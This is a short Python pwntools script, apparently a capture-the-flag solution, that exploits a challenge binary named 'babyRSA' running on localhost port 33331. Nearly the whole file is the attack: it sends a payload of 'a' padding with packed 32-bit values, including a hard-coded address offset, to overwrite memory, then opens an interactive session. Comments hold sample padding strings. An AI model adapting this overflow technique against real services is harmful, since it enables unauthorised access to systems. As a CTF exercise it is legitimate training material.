#!/usr/bin/env python
from pwn import *

#r = process('./babyRSA')
#gdb.attach(r)
r = remote('localhost',33331)

m = 0

hint = 0x804D794
r.sendline(
    str(m)+'a'*(108-len(str(m)))+
    p32(m)+'a'*16+
    p32(hint+4)+'a'*8+
    'bbbb'
)

r.interactive()
r.close()

## trick ##
# 97aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# 98aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
